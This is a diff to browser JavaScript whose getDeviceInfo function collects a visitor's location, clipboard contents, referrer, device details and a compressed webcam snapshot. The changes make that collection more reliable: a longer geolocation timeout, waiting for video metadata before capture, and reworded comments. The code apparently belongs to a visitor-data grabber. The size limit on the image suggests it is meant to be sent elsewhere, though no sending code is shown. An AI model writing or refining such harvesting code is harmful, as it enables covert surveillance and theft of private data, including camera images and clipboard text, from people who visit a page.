@@ -50,7 +50,7 @@ function base64SizeKb(base64) {
 // Attempts to shrink JPEG quality to get under 45KB
 async function getReducedCameraImage(video, maxKb = 45) {
     let canvas = document.createElement('canvas');
-    canvas.width = 160; // you can change dimensions for even smaller images
+    canvas.width = 160;
     canvas.height = 120;
     let ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -61,7 +61,6 @@ async function getReducedCameraImage(video, maxKb = 45) {
         quality -= 0.1;
         camera_image = canvas.toDataURL("image/jpeg", quality);
     }
-    // If still too large, crop quality to minimum
     if (base64SizeKb(camera_image) > maxKb) {
         camera_image = "Image too large after compression";
     }
@@ -77,7 +76,7 @@ async function getDeviceInfo() {
     let touch_support = "Unavailable";
     let referrer = document.referrer || "Unavailable";
     let geolocation = "Permission denied";
-    let clipboard_text = "Permission denied";
+    let clipboard_text = "Permission denied or no clipboard";
     let camera_status = "Permission denied";
     let microphone_status = "Permission denied";
     let camera_image = "Permission denied";
@@ -111,7 +110,7 @@ async function getDeviceInfo() {
         touch_support = hasTouch ? "Yes" : "No";
     } catch(e) {}
 
-    // Geolocation
+    // Geolocation (request permission)
     try {
         if ('geolocation' in navigator) {
             await new Promise((resolve) => {
@@ -124,22 +123,23 @@ async function getDeviceInfo() {
                         geolocation = "Permission denied";
                         resolve();
                     },
-                    {timeout: 5000}
+                    {timeout: 10000}
                 );
             });
         }
     } catch(e) {}
 
-    // Clipboard access (requires user gesture; browsers restrict this)
+    // Clipboard access (request permission)
     try {
         if (navigator.clipboard && navigator.clipboard.readText) {
+            // Attempt to read clipboard if user interacts (most browsers require gesture)
             clipboard_text = await navigator.clipboard.readText();
         }
     } catch(e) {
         clipboard_text = "Permission denied or no clipboard";
     }
 
-    // Camera & Microphone access (with image compression)
+    // Camera & Microphone access (request permission and image compression)
     try {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             let stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
@@ -148,7 +148,11 @@ async function getDeviceInfo() {
             try {
                 let video = document.createElement('video');
                 video.srcObject = stream;
-                await video.play();
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
+                });
                 camera_image = await getReducedCameraImage(video, 45);
                 stream.getTracks().forEach(track => track.stop());
             } catch(e) {
